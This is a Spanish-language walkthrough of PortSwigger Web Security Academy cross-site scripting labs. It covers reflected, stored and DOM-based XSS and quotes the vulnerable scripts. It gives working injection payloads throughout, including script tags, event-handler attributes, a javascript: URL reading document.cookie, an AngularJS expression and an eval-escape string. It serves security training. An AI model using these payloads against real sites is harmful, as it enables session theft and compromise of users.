---
description: All labs of Portswigger https://portswigger.net/web-security/all-labs
---

# Cross-Site-Scripting (Labs)

### Reflected XSS into HTML context with nothing encoded

Vemos un input para buscar contenido, probamos su función y vemos que al escribir cualquier cosa, se ve reflejado en el HTML posterior.

![Formulario de búsqueda](<../.gitbook/assets/image (25).png>)

Al ver reflejado lo que buscamos podemos pensar que quizás se puede inyectar código, probemos con lo más básico.

```
<script>alert()</script>
```

Y nos sale el mensaje de alerta

![Mensaje de alerta](<../.gitbook/assets/image (27).png>)

### Stored XSS into HTML context with nothing encoded

En este caso tenemos que escribir un comentario que provoque un Stored XSS, es decir, que cada persona que entrase en la página donde está dicho comentario le salte el código inyectado.

Probamos directamente a meter el básico en el texto del comentario:

```
<script>alert()</script>
```

¡Y funciona!

### DOM XSS in document.write sink using source location.search

Otra vez tenemos el Input de búsqueda, y también nos imprime como en el primero lo que escribimos, pero cuando probamos el básico de antes vemos que no funciona.

En este caso inspeccionamos el elemento y encontramos el script que está haciendo posible la búsqueda:

```
trackSearch(query) {
document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
trackSearch(query);
}
                    
```

donde pone query parece ser que es donde se añadirá la petición que hagamos, de hecho si miramos un poco más abajo en el código vemos lo siguiente:

```
<img src="/resources/images/tracker.gif?searchTerms=cualquier_cosa">
```

Por lo que podemos construir una query que acabe con esa, por ejemplo:

```
asd'"><script>alert()</script> <"

#Esto quedaría de la siguiente forma en el script
<img src="..searchTerms='asd'"><script>alert()</script> <"">');
```

También podéis optar por la respuesta de PortSwigger algo más elegante:

```
"><svg onload=alert(1)>
```

### DOM XSS in document.write sink using source location.search inside a select element

En este caso nos tenemos que ir dentro de uno de los elementos de la "tienda" y vemos que hay un formulario que realiza un "Check stock" Cómo antes vamos a inspeccionarlo a ver si vemos algo.

Efectivamente encontramos un script:

```
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
    }
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
    }
document.write('</select>');                
```

Básicamente estamos viendo que aparte de los valores que tienes en la variable stores, que coinciden con los del formulario que estamos viendo también existe otra variable que luego añade al formulario.

Lo importante es ¿De donde coge esa variable?

```
var store = (new URLSearchParams(window.location.search)).get('storeId');
```

Parece ser que busca dentro de los parámetros de la URL uno que se llame 'storeId', ¿Esto quiere decir que si introducimos ese valor en la URL el formulario cambia? Comprobemoslo:

```
.../product?productId=1&storeId=cualquier_cosa
```

![Formulario](<../.gitbook/assets/image (26).png>)

¡Perfecto! Ahora nos queda comprobar que ocurre si inyectamos una alerta, no parece que haga ningún tipo de validación de datos, así que vamos a comprobar a lo fácil:

```
.../product?productId=1&storeId=<script>alert()</script>
```

![Mensaje de alerta](<../.gitbook/assets/image (29).png>)

¡Funcionó!

### DOM XSS in innerHTML sink using source location.search

Volvemos a tener el formulario de búsqueda, y además nos encontramos el siguiente script al inspeccionar:

```
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
    }
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
    }
```

Nos damos cuenta que lo que escribimos lo añade directamente al HTML justo en el div superior, por lo que podemos probar a introducir algo que al cargar genere una respuesta en script

```
<img src="https://acb51f291fa14bcbc0ddb3ef008e000d.web-security-academy.net/resources/labheader/images/logoAcademy.svg" onload="alert()">
```

![Formulario búsqueda tras inyección](<../.gitbook/assets/image (24).png>)

Este quise probarlo porque me llamaba la atención que pueda introducir una imagen directamente, y de paso termino el ejercicio gracias al parámetro "onload" pero podríamos realizarlo de otras formas, por ejemplo con un onerror:

```
<img src="" onerror=alert()>
```

### DOM XSS in jQuery anchor href attribute sink using location.search source

En esta ocasión parece que tenemos que explotar un stored XSS, por lo que nos vamos a donde dice Submit Feedback y vamos a inspeccionar a ver si vemos algo:

```
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
    });
```

Para acabar el ejercicio tenemos que conseguir una alerta con el "document.cookie", y vemos que en el script superior está utilizando el parámetro GET de la url para determinar el href de un botón.

Probamos entonces a poner en la URL tras returnPATH=dondeestas, recargamos y tras inspeccionar la página vemos que el botón de back de abajo tiene el siguiente href:

```
href="dondeestas"
```

Así que vamos a transformarlo en algo que pueda darnos las cookies:

```
dondeestas" onload="alert(document.cookie)

#Quedaría tal que así
href="dondeestas" onload="alert(document.cookie)">
```

Pero resulta que no nos funciona y nos intenta mandar a la siguiente URL "https://../dondeestas" onload="alert(document.cookie)" Pero aún podemos probar mediante el comando "javascript:" Esto nos permite hacer que un href realice alguna función, cómo por ejemplo cambiar el color del fondo [https://www.w3schools.com/jsref/tryit.asp?filename=tryjsref\_oper\_void](https://www.w3schools.com/jsref/tryit.asp?filename=tryjsref\_oper\_void)

```
feedback?returnPath=javascript:alert(document.cookie)
```

¡Y conseguimos acabar el ejercicio!

### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

Utilizamos el formulario de búsqueda y al inspeccionar el código en esta ocasión aunque no tenemos un script como tal si que vemos que en body tenemos la directiva ng-app=""

Esta directiva le dice a AngularJS que este es el elemento raíz de la aplicación AngularJS, por lo que podemos utilizar una expresión Angular

```
{{$on.constructor('alert()')()}}
```

### Reflected DOM XSS

Si inspeccionamos el código fuente veremos que search llama a un .js alojado en otro sitio. Entramos y echamos un ojo, vemos que la respuesta se utiliza con una función eval y con algunas pruebas vemos qué esta escapando, en este caso las comillas pero no la barra invertida.

Lo que debemos hacer entonces es primero escapar la barra invertida mediante otra barra invertida "\\" cerramos el término de búsqueda con unas comillas dobles '"', separamos las expresiones con un operador, llamamos a alert cerramos la llave '}' para terminar la función y comentamos lo que haya detrás con dos barras '//'

```
\"/alert(1)}//
```

